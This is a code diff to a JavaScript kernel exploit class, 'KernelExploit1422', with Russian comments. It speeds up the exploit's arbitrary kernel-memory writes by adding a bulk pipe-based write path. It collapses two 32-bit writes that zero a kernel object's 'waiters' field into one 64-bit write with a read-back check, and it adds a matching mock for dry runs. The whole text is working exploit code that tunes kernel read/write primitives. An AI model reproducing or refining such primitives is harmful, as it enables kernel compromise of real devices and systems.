@@ -846,6 +846,11 @@ class KernelExploit1422 {
 				return buf;
 			},
 			write: async (addr, bytes) => {
+				// bulk-путь: 1 round-trip на всю запись, если мост умеет pipeWriteBytes
+				if (this.p && typeof this.p.pipeWriteBytes === "function") {
+					await this.p.pipeWriteBytes(addr, bytes);
+					return;
+				}
 				let off = 0;
 				while (off < bytes.length) {
 					const n = Math.min(8, bytes.length - off);
@@ -905,8 +910,7 @@ class KernelExploit1422 {
 				if (!this.isKernelPointer(shared)) continue;
 				let ok = false;
 				for (let a = 0; a < 3 && !ok; a++) {
-					await this.kwrite32(shared.add32(waiters), 0);
-					await this.kwrite32(shared.add32(waiters + 4), 0);
+					await this.kwrite64(shared.add32(waiters), I64.of({ low: 0, hi: 0 }));   // 8 байт за 1 запись
 					const back = await this.kread32(shared.add32(waiters));
 					ok = (back.value | 0) === 0;
 				}
@@ -1324,6 +1328,10 @@ function makeDryRunMocks(badKernel, noOid, full, objReply) {
 			return bytes.length;
 		};
 		p.pipeReadBytes = async (addr, len) => readBytes(addr, len);   // bulk kernel read via pipe
+		p.pipeWriteBytes = async (addr, bytes) => {                    // bulk kernel write via pipe
+			for (let i = 0; i < bytes.length; i += 4) writeBytes(addr.add32(i), bytes.subarray(i, i + 4));
+			return bytes.length;
+		};
 		p.pipeRead = async (addr, len, out) => { const b = readBytes(addr, len); for (let i = 0; i < len; i++) p.write1(out.add32(i), b[i]); return len; };
 		p.pipeWrite = async (addr, val, len) => {
 			const bytes = new Uint8Array(len);
